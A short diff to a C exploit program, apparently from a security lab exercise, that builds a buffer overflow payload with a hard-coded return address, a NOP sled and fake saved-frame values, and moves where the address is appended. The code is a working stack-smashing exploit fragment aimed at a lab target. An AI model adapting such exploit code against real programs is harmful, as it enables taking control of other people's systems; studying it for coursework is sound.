@@ -18,6 +18,8 @@ int main(void)
   // fake RET + fake SFP 
   // AAAAAAAAAAAA\x9b\xff\xff\xbf\xdc\xfd\xff\xbf
   // \x9b\xff\xff\xbf\xdc\xfd\xff\xbf 
+  strcat(str, "\x97\xff\xff\xbf");
+
   for (int i = 0; i < 16; i++)
   {
   	strcat(str, "\x90");
@@ -25,8 +27,6 @@ int main(void)
   // Segfault:
   // strcat(str, "\x97\xff\xff\xbf");
   // env: 0xbfffff97:	0xdb31c031
-
-  strcat(str, "\x97\xff\xff\xbf");
 
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
